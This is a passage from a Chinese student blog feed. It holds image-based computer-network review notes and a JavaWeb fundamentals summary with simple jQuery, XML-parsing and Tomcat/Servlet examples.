alt="image-20211224124840268"></p><h3 id="C-x2F-S模型"><a href="#C-x2F-S模型" class="headerlink" title="C/S模型"></a>C/S模型</h3><p><img src="/2021/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image-20211224124909658.png" alt="image-20211224124909658"></p><h3 id="p2p模型"><a href="#p2p模型" class="headerlink" title="p2p模型"></a>p2p模型</h3><p><img src="/2021/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image-20211224124920221.png" alt="image-20211224124920221"></p><h2 id="域名解析"><a href="#域名解析" class="headerlink" title="域名解析"></a>域名解析</h2><p><img src="/2021/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image-20211224124941116.png" alt="image-20211224124941116"></p><p><img src="/2021/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image-20211224124946868.png" alt="image-20211224124946868"></p><h3 id="域名服务器"><a href="#域名服务器" class="headerlink" title="域名服务器"></a>域名服务器</h3><p><img src="/2021/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image-20211224125007337.png" alt="image-20211224125007337"></p><h3 id="解析过程"><a href="#解析过程" class="headerlink" title="解析过程"></a>解析过程</h3><p><img src="/2021/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image-20211224125020602.png" alt="image-20211224125020602"></p><h2 id="电子邮件"><a href="#电子邮件" class="headerlink" title="电子邮件"></a>电子邮件</h2><p><img src="/2021/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image-20211224125119948.png" alt="image-20211224125119948"></p><h3 id="MIME"><a href="#MIME" class="headerlink" title="MIME"></a>MIME</h3><p><img src="/2021/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image-20211224125141132.png" alt="image-20211224125141132"></p><h3 id="POP3"><a href="#POP3" class="headerlink" title="POP3"></a>POP3</h3><p><img src="/2021/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image-20211224125148863.png" alt="image-20211224125148863"></p><h3 id="IMAP"><a href="#IMAP" class="headerlink" title="IMAP"></a>IMAP</h3><p><img src="/2021/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image-20211224125156963.png" alt="image-20211224125156963"></p><h2 id="第五章题目"><a href="#第五章题目" class="headerlink" title="第五章题目"></a>第五章题目</h2><p><img src="/2021/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image-20211224125424418.png" alt="image-20211224125424418"></p><p><img src="/2021/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image-20211224125455431.png" alt="image-20211224125455431"></p><p><img src="/2021/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image-20211224125552891.png" alt="image-20211224125552891"></p>]]></content>
      
      
      <categories>
          
          <category> 计算机 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 计算机网络复习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>javaWeb基础阶段总结</title>
      <link href="/2021/11/30/javaWeb/"/>
      <url>/2021/11/30/javaWeb/</url>
      
        <content type="html"><![CDATA[<h2 id="JAVAweb在学什么？"><a href="#JAVAweb在学什么？" class="headerlink" title="JAVAweb在学什么？"></a>JAVAweb在学什么？</h2><p>javaWeb 是指，所有通过 Java 语言编写可以通过浏览器访问的程序的总称，叫 JavaWeb。 JavaWeb 是基于请求和响应来开发的。</p><p>先看这张总体图，咱们再来慢慢细说：</p><p><img src="/2021/11/30/javaWeb/image-20211126193359589.png" alt="image-20211126193359589"></p><p>​浏览器端的主要技术：</p><ul><li>HTML （结构）</li><li>CSS     （表现）</li><li>JavaScript  （行为）</li><li>jQuery</li></ul><p>其中jQuery是JavaScript开发的js类库。</p><p>前端技术主要负责页面显示，像html,css,js这些都有浏览器解析。HTML主要用于编写网页框架。css主要用于对网页内容的修饰。利用选择器，选择标签，然后对标签的属性设置。js主要处理相应的事件，比如在html中的button标签中绑定单击事件，当按钮被按下的时候会执行相应的内容。</p><p>jQuery是JavaScript的查询，它是辅助JavaScript开发的类库，jQuery的核心思想就是写的更少，做的更多。</p><p>后端：</p><p>tomact: 由 Apache 组织提供的一种 Web 服务器，提供对 jsp 和 Servlet 的支持。它是一种轻量级的 javaWeb 容器（服务 器），也是当前应用最广的 JavaWeb 服务器（免费)</p><p>其中Servlet,Filter和Listener是javaweb三大组件，servlet应该是这三个中最重要的了。</p><p>web的工作方式：主要是前端发送请求，后端通过servlet程序获取前端传过来的参数进行相应的处理，把需要的处理结果返回到前端，但是如果使用servlet向前端返回html代码，这样写明显不好。因此我们使用jsp，让java代码嵌入到html中，动态的显示页面内容。但是如何实现数据共享呢？这就要使用几个域对象，把数据放到域对象中，进行数据共享来实现后端数据，前端可以使用。如果这样的话，每次请求服务器都要发送一次请求，都要进行一次页面的加载，会消耗内存，也会降低用户体验，一次出现了Ajax，使用Ajax进行局部也灭能异步更新。所谓局部，就是一个HTML页面中，如果主要对某个div标签进行内容设置，那么请求之后，其他页面都不需要重新加载，所闻异步就是，当Ajax发送请求的时候，在与服务器通信的时间，并不会出现阻塞现象，这回增加用户的体验感。常见的Ajax请求就是在注册页面提示用户名不可用的地方，当用户名输入框失去焦点后，触发事件，此时把用户名发送到后端，后端程序与数据库信息对比，返回给前端，这个用户名是否可见，最终以友好提示的方式显示在网页，而这一切都是自动完成的，用户只接受到了是否可用的信息，这大大增大了用户体验感。http协议是不具有记忆功能的，那么每次请求服务器都不知道是谁访问的，因此用户需要一直登录，这就很麻烦了，一次使用cookie和session技术，来实现免登录。cookie是浏览每次发送请求的时候都会携带着的，因此只需要在服务器端验证cookie就可以实现免登录啦。</p><p>下面怎么来对各个功能进行详细的复习。</p><h2 id="HTML"><a href="#HTML" class="headerlink" title="HTML"></a>HTML</h2><p>html是超文本标记语言，不属于编程语言，学习html主要是学习它的标签，但是html有很多标签，作为一个非前端开发人员标签学完很快就忘了，所以要记住比较重要且常见的。</p><ul><li><h3 id="表格"><a href="#表格" class="headerlink" title="表格"></a>表格</h3><p><img src="/2021/11/30/javaWeb/image-20211126193757354.png" alt="image-20211126193757354"></p></li><li><h3 id="表单"><a href="#表单" class="headerlink" title="表单"></a>表单</h3><p><img src="/2021/11/30/javaWeb/image-20211126193939464.png" alt="image-20211126193939464"></p></li></ul><h2 id="CSS"><a href="#CSS" class="headerlink" title="CSS"></a>CSS</h2><p><img src="/2021/11/30/javaWeb/image-20211126194019954.png" alt="image-20211126194019954"></p><p>例如：</p><p><code>body { padding: 36pt 24pt 36pt; }  body { padding: 11.5%; }  body {  padding: 10% 10% 10% 10%; } </code></p><h3 id="CSS-选择器"><a href="#CSS-选择器" class="headerlink" title="CSS 选择器"></a>CSS 选择器</h3><p>选择顾名思义就是通过选择器，选中html的标签，进行修饰，选择器有3种。</p><ol><li><p>标签名选择器</p><p><img src="/2021/11/30/javaWeb/image-20211126194107685.png" alt="image-20211126194107685"></p><p><img src="/2021/11/30/javaWeb/image-20211126194136801.png" alt="image-20211126194136801"></p></li><li><p>id 选择器</p><p><img src="/2021/11/30/javaWeb/image-20211126194221335.png" alt="image-20211126194221335"></p></li><li><p>class 选择器（类选择器）</p><p><img src="/2021/11/30/javaWeb/image-20211126194255202.png" alt="image-20211126194255202"></p></li><li><p>组合选择器</p><p><img src="/2021/11/30/javaWeb/image-20211126194327874.png" alt="image-20211126194327874"></p></li></ol><p><img src="/2021/11/30/javaWeb/image-20211126194421678.png" alt="image-20211126194421678"></p><h2 id="JS"><a href="#JS" class="headerlink" title="JS"></a>JS</h2><h3 id="变量和特殊的运算"><a href="#变量和特殊的运算" class="headerlink" title="变量和特殊的运算"></a>变量和特殊的运算</h3><p><img src="/2021/11/30/javaWeb/image-20211126194529059.png" alt="image-20211126194529059"></p><h3 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h3><p><img src="/2021/11/30/javaWeb/image-20211126194615746.png" alt="image-20211126194615746"></p><h3 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h3><p><img src="/2021/11/30/javaWeb/image-20211126194650240.png" alt="image-20211126194650240"></p><p><img src="/2021/11/30/javaWeb/image-20211126194836167.png" alt="image-20211126194836167"></p><p><img src="/2021/11/30/javaWeb/image-20211126195049446.png" alt="image-20211126195049446"></p><p><strong>注：在 Java 中函数允许重载。但是在 JS 中函数的重载会直接覆盖掉上一次的定义</strong></p><h3 id="自定义对象"><a href="#自定义对象" class="headerlink" title="自定义对象"></a>自定义对象</h3><p><img src="/2021/11/30/javaWeb/image-20211126195113372.png" alt="image-20211126195113372"></p><p><img src="/2021/11/30/javaWeb/image-20211126195150805.png" alt="image-20211126195150805"></p><p>第二种方式</p><p><img src="/2021/11/30/javaWeb/image-20211126195236425.png" alt="image-20211126195236425"></p><h3 id="js中常见的事件"><a href="#js中常见的事件" class="headerlink" title="js中常见的事件"></a>js中常见的事件</h3><p><img src="/2021/11/30/javaWeb/image-20211126195330267.png" alt="image-20211126195330267"></p><h3 id="DOM模型"><a href="#DOM模型" class="headerlink" title="DOM模型"></a>DOM模型</h3><p><img src="/2021/11/30/javaWeb/image-20211126195406241.png" alt="image-20211126195406241"></p><h2 id="jQuery"><a href="#jQuery" class="headerlink" title="jQuery"></a>jQuery</h2><h3 id="jQuery介绍"><a href="#jQuery介绍" class="headerlink" title="jQuery介绍"></a>jQuery介绍</h3><script type="text/javascript" src="../script/jquery-1.7.2.js"></script><script type="text/javascript">    // window.onload = function () {    // var btnObj = document.getElementById("btnId");    // // alert(btnObj);//[object HTMLButtonElement] ====>>> dom 对象    // btnObj.onclick = function () {    // alert("js 原生的单击事件");    // }    // }    $(function () { // 表示页面加载完成 之后，相当    window.onload = function () {}        var $btnObj = $("#btnId"); // 表示按 id 查询标签对象        $btnObj.click(function () { // 绑定单击事件        alert("jQuery 的单击事件");        });    });</script><h3 id="jQuery-核心函数"><a href="#jQuery-核心函数" class="headerlink" title="jQuery 核心函数"></a>jQuery 核心函数</h3><p><img src="/2021/11/30/javaWeb/image-20211126195711488.png" alt="image-20211126195711488"></p><h3 id="jQuery和DOM对象的转换"><a href="#jQuery和DOM对象的转换" class="headerlink" title="jQuery和DOM对象的转换"></a>jQuery和DOM对象的转换</h3><p><img src="/2021/11/30/javaWeb/image-20211126195809136.png" alt="image-20211126195809136"></p><h3 id="案例"><a href="#案例" class="headerlink" title="案例"></a>案例</h3><p>下面放图片跟随鼠标的案例</p><pre class="line-numbers language-html"><code class="language-html"><span class="token doctype">&lt;!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">http-equiv</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>Content-Type<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text/html; charset<span class="token punctuation">=</span>UTF-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>Insert title here<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>style</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text/css<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token style language-css">   <span class="token selector">body </span><span class="token punctuation">{</span>      <span class="token property">text-align</span><span class="token punctuation">:</span> center<span class="token punctuation">;</span>   <span class="token punctuation">}</span>   <span class="token selector"><span class="token id">#small</span> </span><span class="token punctuation">{</span>      <span class="token property">margin-top</span><span class="token punctuation">:</span> <span class="token number">150</span>px<span class="token punctuation">;</span>   <span class="token punctuation">}</span>   <span class="token selector"><span class="token id">#showBig</span> </span><span class="token punctuation">{</span>      <span class="token property">position</span><span class="token punctuation">:</span> absolute<span class="token punctuation">;</span>      <span class="token property">display</span><span class="token punctuation">:</span> none<span class="token punctuation">;</span>   <span class="token punctuation">}</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>style</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text/javascript<span class="token punctuation">"</span></span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>script/jquery-1.7.2.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script language-javascript"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text/javascript<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script language-javascript">   <span class="token function">$</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>      <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">"#small"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">bind</span><span class="token punctuation">(</span><span class="token string">"mouseover mouseout mousemove"</span><span class="token punctuation">,</span><span class="token keyword">function</span> <span class="token punctuation">(</span>event<span class="token punctuation">)</span> <span class="token punctuation">{</span>         <span class="token keyword">if</span> <span class="token punctuation">(</span>event<span class="token punctuation">.</span>type <span class="token operator">==</span> <span class="token string">"mouseover"</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">"#showBig"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">show</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token punctuation">}</span><span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span>event<span class="token punctuation">.</span>type <span class="token operator">==</span> <span class="token string">"mouseout"</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">"#showBig"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">hide</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token punctuation">}</span><span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span>event<span class="token punctuation">.</span>type <span class="token operator">==</span> <span class="token string">"mousemove"</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">"#showBig"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">offset</span><span class="token punctuation">(</span><span class="token punctuation">{</span>               left<span class="token punctuation">:</span> event<span class="token punctuation">.</span>pageX <span class="token operator">+</span> <span class="token number">10</span><span class="token punctuation">,</span>               top<span class="token punctuation">:</span> event<span class="token punctuation">.</span>pageY <span class="token operator">+</span> <span class="token number">10</span>            <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token punctuation">}</span>      <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>small<span class="token punctuation">"</span></span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>img/small.jpg<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>showBig<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>img/big.jpg<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="XML和Tomcat"><a href="#XML和Tomcat" class="headerlink" title="XML和Tomcat"></a>XML和Tomcat</h2><p>XML是可扩展标记语言，常用于前后端传输数据使用，但是现在已经逐渐被json代替。不过，xml应用比较多的地方还是配置文件。</p><p>下面是xml的形式：</p><p><img src="/2021/11/30/javaWeb/image-20211126200142040.png" alt="image-20211126200142040"></p><h3 id="xml的解析"><a href="#xml的解析" class="headerlink" title="xml的解析"></a>xml的解析</h3><p>所需第三方的类库：</p><p>链接：<a href="https://pan.baidu.com/s/1aFVC3WZ1zOnmlkB0jh6IVA">https://pan.baidu.com/s/1aFVC3WZ1zOnmlkB0jh6IVA</a>    提取码：0uw9 </p><ul><li><p>第一步： 先加载 xml 文件创建 Document 对象 </p></li><li><p>第二步：通过 Document 对象拿到根元素对象</p></li><li><p>第三步：通过根元素.elelemts(标签名); 可以返回一个集合，这个集合里放着。所有你指定的标签名的元素对象 </p></li><li><p>第四步：找到你想要修改、删除的子元素，进行相应在的操作 </p></li><li><p>第五步，保存到硬盘上</p><p>xml内容：</p><pre class="line-numbers language-xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0" encoding="UTF-8"?></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>books</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>book</span> <span class="token attr-name">sn</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>SN12341232<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>name</span><span class="token punctuation">></span></span>辟邪剑谱<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>name</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>price</span><span class="token punctuation">></span></span>9.9<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>price</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>author</span><span class="token punctuation">></span></span>班主任<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>author</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>book</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>book</span> <span class="token attr-name">sn</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>SN12341231<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>name</span><span class="token punctuation">></span></span>葵花宝典<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>name</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>price</span><span class="token punctuation">></span></span>99.99<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>price</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>author</span><span class="token punctuation">></span></span>班长<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>author</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>book</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>books</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul><pre class="line-numbers language-java"><code class="language-java">   <span class="token comment" spellcheck="true">//1.读取books.xml</span>        SAXReader saxReader <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">SAXReader</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        Document document <span class="token operator">=</span> null<span class="token punctuation">;</span>        <span class="token keyword">try</span> <span class="token punctuation">{</span>            document <span class="token operator">=</span> saxReader<span class="token punctuation">.</span><span class="token function">read</span><span class="token punctuation">(</span><span class="token string">"src/book.xml"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">DocumentException</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token comment" spellcheck="true">//2.通过Document对象获取根元素</span>        Element rootElement <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getRootElement</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token comment" spellcheck="true">// System.out.println(rootElement);</span>        <span class="token comment" spellcheck="true">//3.通过根元素获取book标签对象</span>        List<span class="token operator">&lt;</span>Element<span class="token operator">></span> books <span class="token operator">=</span> rootElement<span class="token punctuation">.</span><span class="token function">elements</span><span class="token punctuation">(</span><span class="token string">"book"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//4.遍历，处理每个book标签转换为book类</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span>Element book <span class="token operator">:</span> books<span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token comment" spellcheck="true">//asXML把标签对象转换成标签字符串</span>            Element nameElement <span class="token operator">=</span> book<span class="token punctuation">.</span><span class="token function">element</span><span class="token punctuation">(</span><span class="token string">"name"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            String nameText <span class="token operator">=</span> nameElement<span class="token punctuation">.</span><span class="token function">getText</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>               <span class="token comment" spellcheck="true">//System.out.println(nameText);</span>            String price <span class="token operator">=</span> book<span class="token punctuation">.</span><span class="token function">elementText</span><span class="token punctuation">(</span><span class="token string">"price"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>             String author <span class="token operator">=</span> book<span class="token punctuation">.</span><span class="token function">elementText</span><span class="token punctuation">(</span><span class="token string">"author"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//获取标签信息内容</span>            String sn <span class="token operator">=</span> book<span class="token punctuation">.</span><span class="token function">attributeValue</span><span class="token punctuation">(</span><span class="token string">"sn"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">//获取属性信息</span>            System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Book</span><span class="token punctuation">(</span>sn<span class="token punctuation">,</span>nameText<span class="token punctuation">,</span>Double<span class="token punctuation">.</span><span class="token function">parseDouble</span><span class="token punctuation">(</span>price<span class="token punctuation">)</span><span class="token punctuation">,</span>author<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="Tomcat"><a href="#Tomcat" class="headerlink" title="Tomcat"></a>Tomcat</h3><h4 id="请求和响应"><a href="#请求和响应" class="headerlink" title="请求和响应"></a>请求和响应</h4><p><img src="/2021/11/30/javaWeb/image-20211127151235134.png" alt="image-20211127151235134"></p><h4 id="Tomcat和JavaEE对应的版本"><a href="#Tomcat和JavaEE对应的版本" class="headerlink" title="Tomcat和JavaEE对应的版本"></a>Tomcat和JavaEE对应的版本</h4><p><img src="/2021/11/30/javaWeb/image-20211127151258040.png" alt="image-20211127151258040"></p><h4 id="Tomcat-的安装和使用"><a href="#Tomcat-的安装和使用" class="headerlink" title="Tomcat 的安装和使用"></a>Tomcat 的安装和使用</h4><h5 id="Tomcat安装和目录介绍"><a href="#Tomcat安装和目录介绍" class="headerlink" title="Tomcat安装和目录介绍"></a>Tomcat安装和目录介绍</h5><p>链接：<a href="https://pan.baidu.com/s/12gYtwztn7nOXJqGDn6ooHw">https://pan.baidu.com/s/12gYtwztn7nOXJqGDn6ooHw</a>   提取码：5n39 </p><p>双击bin目录下的startup.bat，运行tomcat，如果启动失败，则需要配置如下环境变量</p><p><img src="/2021/11/30/javaWeb/image-20211127151345225.png" alt="image-20211127151345225"></p><p>Tomcat 的停止 （三种方式）</p><p>1、点击 tomcat 服务器窗口的 x 关闭按钮</p><p>2、把 Tomcat 服务器窗口置为当前窗口，然后按快捷键 Ctrl+C </p><p>3、找到 Tomcat 的 bin 目录下的 shutdown.bat 双击，就可以停止 Tomcat 服务器</p><h4 id="如何部暑-web-工程到-Tomcat"><a href="#如何部暑-web-工程到-Tomcat" class="headerlink" title="如何部暑 web 工程到 Tomcat"></a>如何部暑 web 工程到 Tomcat</h4><p><img src="/2021/11/30/javaWeb/image-20211127153005110.png" alt="image-20211127153005110"></p><p><img src="/2021/11/30/javaWeb/image-20211127153016397.png" alt="image-20211127153016397"></p><p><img src="/2021/11/30/javaWeb/image-20211127153034197.png" alt="image-20211127153034197"></p><h2 id="Servlet"><a href="#Servlet" class="headerlink" title="Servlet"></a>Servlet</h2><ol><li>Servlet 是 JavaEE 规范之一。规范就是接口 </li><li>Servlet 就 JavaWeb 三大组件之一。</li><li>三大组件分别是：Servlet 程序、Filter 过滤器、Listener 监听器。 </li><li>Servlet 是运行在服务器上的一个 java 小程序，它可以接收客户端发送过来的请求，并响应数据给客户端。</li></ol><h3 id="Servlaet程序的实现"><a href="#Servlaet程序的实现" class="headerlink" title="Servlaet程序的实现"></a>Servlaet程序的实现</h3><h4 id="通过实现Servlet接口"><a href="#通过实现Servlet接口" class="headerlink" title="通过实现Servlet接口"></a>通过实现Servlet接口</h4><p><img src="/2021/11/30/javaWeb/image-20211127153228180.png" alt="image-20211127153228180"></p><p><img src="/2021/11/30/javaWeb/image-20211127153243514.png" alt="image-20211127153243514"></p><p>web.xml配置信息：</p><p><img src="/2021/11/30/javaWeb/image-20211127153302923.png" alt="image-20211127153302923"></p><h4 id="通过继承-HttpServlet-实现-Servlet-程序"><a href="#通过继承-HttpServlet-实现-Servlet-程序" class="headerlink" title="通过继承 HttpServlet 实现 Servlet 程序"></a>通过继承 HttpServlet 实现 Servlet 程序</h4><p><img src="/2021/11/30/javaWeb/image-20211127153510331.png" alt="image-20211127153510331"></p><h3 id="URL和xml配置文件的对应关系"><a href="#URL和xml配置文件的对应关系" class="headerlink" title="URL和xml配置文件的对应关系"></a>URL和xml配置文件的对应关系</h3><p><img src="/2021/11/30/javaWeb/image-20211127153400510.png" alt="image-20211127153400510"></p><h3 id="Servlet的生命周期"><a href="#Servlet的生命周期" class="headerlink" title="Servlet的生命周期"></a>Servlet的生命周期</h3><p><img 